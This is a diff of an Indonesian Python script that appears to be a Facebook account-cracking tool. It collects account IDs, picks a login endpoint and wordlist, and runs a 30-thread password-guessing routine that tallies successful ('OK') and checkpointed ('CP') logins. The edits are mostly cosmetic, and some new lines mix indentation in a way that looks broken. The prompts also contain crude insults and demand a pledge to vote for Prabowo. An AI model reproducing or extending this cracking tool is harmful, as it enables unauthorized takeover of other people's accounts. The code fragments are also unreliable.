@@ -678,7 +678,7 @@ def massal():
 		exit()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	cetak(nel(f"                        [bold blue]login ID Crack",title=f"{H2}{len(id)}{P2} ID TELAH DIKUMPULKAN"))
+	cetak(nel(f"                        [bold blue]login ID Crack",title=f"{H2}{len(id)}{P2}{M2} ID TELAH DIKUMPULKAN"))
 	print(f"{H2}╰─▶ {B2}01 [bold purple]Facebook ID {M2}Old\n")
 	print(f"{H2}╰─▶ {B2}02 [bold purple]Facebook ID {K2}New\n")
 	print(f"{H2}╰─▶ {B2}03 [bold purple]Facebook ID {H2}Random\n")
@@ -702,10 +702,10 @@ def setting():
 	else:
 		prints(f'         {P}[red]Input Tidak Diketahui{P}')
 		login_menu()
-	prints(nel(f'                        [blue]login Method')) 
-	prints(f'{H2}╰─▶ {B2}01 [bold purple]Method free.facebook.com [[green] Validate [white]]\n')
-	prints(f'{H2}╰─▶ {B2}02 [bold purple]Method m.facebook.com [[green] Async [white]]\n')
-	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [[green] B-Api [white]]')
+	prints(nel(f'                         [blue]login Method')) 
+	prints(f'{H2}╰─▶ {B2}01 [bold purple]Method free.facebook.com [green] Validate [white]\n')
+	prints(f'{H2}╰─▶ {B2}02 [bold purple]Method m.facebook.com [green] Async [white]\n')
+	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [green] B-Api [white]')
 	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if hc in ['1','01']:
 		method.append('metod1')
@@ -716,7 +716,7 @@ def setting():
 	else:
 		method.append('metod1')
 	print('')
-	_jembot_ = input('✶ ━━⫸ {h}Tambahkan Aplikasi Terkait {m}( Y/t ) ')
+	_jembot_ = input('✶ ━━⫸ {H}Tambahkan Aplikasi Terkait {M}( Y/t ) ')
 	if _jembot_ in ['']:
 		print(' [red]Pilih Yang Bener Kontol ')
 		back()
@@ -736,7 +736,7 @@ def setting():
 	else:
 		pwpluss.append('no')
 	print('')
-	tai = input('✶ ━━⫸ {h}Saya Janji Akan Pilih Prabowo {m}( Y/t ) ')
+	tai = input('✶ ━━⫸ {H}Saya Janji Akan Pilih Prabowo {M}( Y/t ) ')
 	if tai in ['t','T']:
 		print(' [red]Harus Pilih prabowo Klo Ga Pilih Jangan Pke Scnya ')
 		back()
@@ -745,7 +745,7 @@ def setting():
 	else:
 		print(' [red]Gausah pke scnya kontol klo ga pilih Prabowo ')
 		str(tai)
-	prints(f'{B2}Ketik "bismillah" Untuk Memulai Crack, Semoga ijo ')
+	prints(f'╰─▶{B2}Ketik "bismillah" Untuk Memulai Crack, Semoga ijo ')
 	hc = input(f'✶ ━━⫸ {H} Ketik{N} : ')
 	if hc in ['bismillah','Bismillah','BISMILLAH']:
 		passwrd()
@@ -756,6 +756,9 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
+    loading()
+    clear()
+    banner()
 	prints(nel(f'             {M2}!{H} PROSES CRACK SEDANG BERLANGSUNG{M2} !')) 
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -1369,7 +1372,7 @@ def kontol(idf,pwv):
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{x}[{M2}RR07{x}] | {P}{asu}{loop}{P} | {H}OK-{ok} {P}| {K}CP-{cp}")
+	sys.stdout.write(f"\r{x}[{asu}RR07{x}] | {P}{asu}{loop}{P} | {H}OK-{ok} {P}| {K}CP-{cp}")
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
